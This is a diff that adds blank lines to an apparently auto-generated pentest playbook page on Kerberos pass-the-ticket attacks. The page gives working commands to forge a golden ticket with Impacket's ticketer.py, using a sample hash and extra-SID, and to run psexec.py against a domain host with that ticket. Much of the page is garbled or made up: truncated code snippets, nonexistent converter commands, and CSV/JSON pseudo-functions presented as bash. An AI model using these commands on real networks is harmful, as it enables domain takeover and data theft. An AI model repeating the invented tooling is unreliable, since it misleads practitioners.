@@ -46,6 +46,8 @@ From a technical perspective, this attack works by taking advantage of the way K
 
 The business value of this attack is that it allows attackers to gain full access to a network and steal sensitive data, compromising the integrity and confidentiality of an organization's information.
 
+ 
+
 ## Requirements
 
 1. Valid domain credentials
@@ -56,6 +58,8 @@ The business value of this attack is that it allows attackers to gain full acces
 
 1. Kirbi ticket
 
+ 
+
 ## Defense
 
 1. Implement multi-factor authentication to prevent attackers from obtaining valid domain credentials
@@ -63,6 +67,8 @@ The business value of this attack is that it allows attackers to gain full acces
 1. Monitor for abnormal login activity and ticket requests
 
 1. Implement network segmentation to limit lateral movement
+
+ 
 
 ## Objectives
 
@@ -72,20 +78,34 @@ The business value of this attack is that it allows attackers to gain full acces
 
 1. Exfiltrate sensitive data
 
+ 
+
 # Instructions
 
 1. This command is used to convert a kirbi ticket to ccache using kekeo or ticketer from Impacket. Once the conversion is done, the ccache ticket is exported to a file and the contents of the file are displayed using the 'cat' command. Finally, psexec is used to execute commands on a remote machine with the help of the ccache ticket.
 
+ 
+
+
+
 **Code**: [[# Convert the ticket kirbi to ccache with kekeo
 mi]]
 
+
+
 > The command starts by converting a kirbi ticket to ccache using either kekeo or ticketer from Impacket. The converted ccache ticket is then exported to a file and the contents of the file are displayed using the 'cat' command. Finally, psexec is used to execute commands on a remote machine with the help of the ccache ticket. The '-k' flag is used to indicate that the ccache ticket should be used for authentication, while the '-no-pass' flag indicates that no password should be used. The '-dc-ip' flag is used to specify the IP address of the domain controller, while 'AD/administrator@192.168.1.100' specifies the user account to use for authentication.
+
+
 
 **Command** ([[Convert ticket kirbi to ccache with kekeo]]):
 
 ```bash
 misc::convert ccache ticket.kirbi
 ```
+
+
+
+
 
 **Command** ([[Alternatively, use ticketer from Impacket]]):
 
@@ -95,11 +115,19 @@ ticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrato
 ./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
 ```
 
+
+
+
+
 **Command** ([[Set KRB5CCNAME environment variable]]):
 
 ```bash
 export KRB5CCNAME=/home/user/ticket.ccache
 ```
+
+
+
+
 
 **Command** ([[Display the contents of the KRB5CCNAME file]]):
 
@@ -107,17 +135,31 @@ export KRB5CCNAME=/home/user/ticket.ccache
 cat $KRB5CCNAME
 ```
 
+
+
+
+
 **Command** ([[Execute psexec.py with the ticket]]):
 
 ```bash
 ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100
 ```
 
+
+
 2. To convert a ticket from Windows to Linux, use the command 'win_to_lin_ticket_converter'. To convert a ticket from Linux to Windows, use the command 'lin_to_win_ticket_converter'.
+
+ 
+
+
 
 **Code**: [[ticket_converter]]
 
+
+
 > The 'win_to_lin_ticket_converter' command takes one argument, which is the path to the Windows ticket file. The converted Linux ticket will be saved in the same directory with the same name, but with the '.krb5' extension. The 'lin_to_win_ticket_converter' command takes one argument, which is the path to the Linux ticket file. The converted Windows ticket will be saved in the same directory with the same name, but with the '.kirbi' extension.
+
+
 
 **Command** ([[Read CSV file]]):
 
@@ -125,11 +167,19 @@ cat $KRB5CCNAME
 read_csv('tickets.csv')
 ```
 
+
+
+
+
 **Command** ([[Convert CSV to JSON]]):
 
 ```bash
 convert_to_json()
 ```
+
+
+
+
 
 **Command** ([[Write JSON to file]]):
 
@@ -137,9 +187,17 @@ convert_to_json()
 write_json('tickets.json')
 ```
 
+
+
 3. The Kekeo tool is a powerful toolkit for interacting with Microsoft Kerberos authentication. It allows you to perform various actions such as dumping Kerberos tickets, brute-forcing Kerberos passwords, and more.
 
+ 
+
+
+
 **Code**: [[kekeo]]
+
+
 
 > The 'kekeo' command is used to launch the Kekeo tool and access its various functionalities. The tool can be used to perform actions such as dumping Kerberos tickets, brute-forcing Kerberos passwords, and more. The command can be further customized using various arguments such as '-ticket' to specify the path to a Kerberos ticket, '-target' to specify the target domain or computer, '-rc4' to use RC4 encryption, and more. For more information on the available arguments and their usage, please refer to the Kekeo documentation.
 
@@ -151,9 +209,17 @@ To convert a Kerberos ticket file to a CCache file, run the following command:
 
 python ticket_converter.py <kirbi_file> <ccache_file>
 
+ 
+
+
+
 **Code**: [[root@kali:ticket_converter$ python ticket_converte]]
 
+
+
 > The 'ticket_converter.py' script is used to convert between CCache and Kerberos ticket files. The first argument is the path to the input file, and the second argument is the path to the output file. When converting from CCache to Kerberos ticket format, the output file will have a '.kirbi' extension. When converting from Kerberos ticket format to CCache, the output file will have a '.ccache' extension.
+
+
 
 **Command** ([[Convert ccache to kirbi using ticket_converter.py]]):
 
@@ -161,11 +227,17 @@ python ticket_converter.py <kirbi_file> <ccache_file>
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 ```
 
+
+
+
+
 **Command** ([[Convert kirbi to ccache using ticket_converter.py]]):
 
 ```bash
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -198,3 +270,5 @@ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 - [[Kerberos Tickets]]
 - [[Pass-the-Ticket Golden Tickets]]
 - [[Using a ticket on Linux]]
+
+
